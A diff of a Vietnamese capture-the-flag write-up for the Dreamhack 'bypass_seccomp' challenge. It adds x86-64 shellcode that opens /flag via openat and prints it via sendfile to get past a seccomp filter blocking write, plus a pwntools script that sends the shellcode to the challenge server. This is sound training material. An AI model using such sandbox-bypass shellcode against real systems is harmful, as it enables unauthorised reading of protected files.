@@ -27,10 +27,60 @@ Shellcode mở file:
 
     mov rax, 113668128124718  --> */flag\00*
     push rax
-    mov rax, 257             //syscall openat
+    mov rax, 257             
     mov rdi, -100            //AT_FDCWD
     mov rsi, rsp
     xor rdx, rdx
     xor r10, r10
     syscall
 
+File đã dược mở bây giờ cần in ra màn hình. Nhưng vì thiếu `write` nên ta sẽ dùng hàm khác để in.
+
+<img width="1026" height="186" alt="image" src="https://github.com/user-attachments/assets/0b7119a4-c733-4910-b982-6c4d4c44010b" />
+
+<br><br>
+Hàm `sendfile`: Sao chép dữ liệu giữa 2 file descriptor (fd).
+
+Shellcode in dữ liệu:
+
+    mov rsi, rax        //fd in
+    mov rax, 40
+    mov rdi, 1          //fd out
+    xor rdx, rdx
+    mov r10, 0x100
+    syscall
+
+## Script Python
+
+    #!/usr/bin/env python3
+    
+    from pwn import *
+    
+    exe = ELF("./bypass_seccomp_patched")
+    libc = ELF("./libc.so.6")
+    ld = ELF("./ld-2.35.so")
+    
+    context.binary = exe
+    p=remote('host3.dreamhack.games',13417)
+    
+    shellcode=asm('''
+        mov rax, 113668128124718
+        push rax
+        mov rax, 257
+        mov rdi, -100
+        mov rsi, rsp
+        xor rdx, rdx
+        xor r10, r10
+        syscall
+    
+        mov rsi, rax
+        mov rax, 40
+        mov rdi, 1
+        xor rdx, rdx
+        mov r10, 0x100
+        syscall
+        ''', arch='amd64')
+    
+    p.sendafter(b'shellcode: ',shellcode)
+    
+    p.interactive()
